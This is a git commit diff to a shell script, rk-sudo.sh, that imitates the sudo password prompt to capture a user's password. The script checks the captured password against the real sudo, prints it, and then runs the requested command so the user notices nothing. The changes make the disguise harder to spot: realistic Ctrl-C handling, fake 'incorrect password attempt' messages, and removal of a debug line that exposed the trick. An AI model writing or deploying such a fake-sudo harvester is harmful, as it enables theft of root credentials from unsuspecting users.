0130c8f8410f8ea0fab807fd231892708e9052a9
Eric Wustrow <ewust@umich.edu>
2015-11-24 17:30:53 -0500

    better sudo emulation

--- rk-sudo.sh
+++ rk-sudo.sh
@@ -2,9 +2,33 @@
 
 /usr/bin/sudo -k
 
-for i in `seq 3`;
+trap ctrl_c SIGINT
+
+function ctrl_c() {
+    if [ $state -eq 1 ];
+    then
+        # waiting for sudo to return, just kill it and continue
+        return
+    fi
+
+    # otherwise, we were waiting in the password prompt
+    echo ""
+    if [ $i -ne 0 ];
+    then
+        echo "sudo: $i incorrect password attempt"
+    fi
+    stty echo
+    exit
+}
+
+state=0
+
+for i in `seq 0 2`;
 do
+
+    state=0
     read -s -p "[sudo] password for $USER: " rootpw
+    state=1
     echo ""
 
     echo $rootpw | /usr/bin/sudo -S /bin/true 2> /dev/null
@@ -17,7 +41,6 @@ do
     elif [ $sudores -eq 0 ];
     then
         echo "Got your pw: $rootpw"
-        echo "gonna run cmd '$@'"
         /usr/bin/sudo $@
         exit
     fi
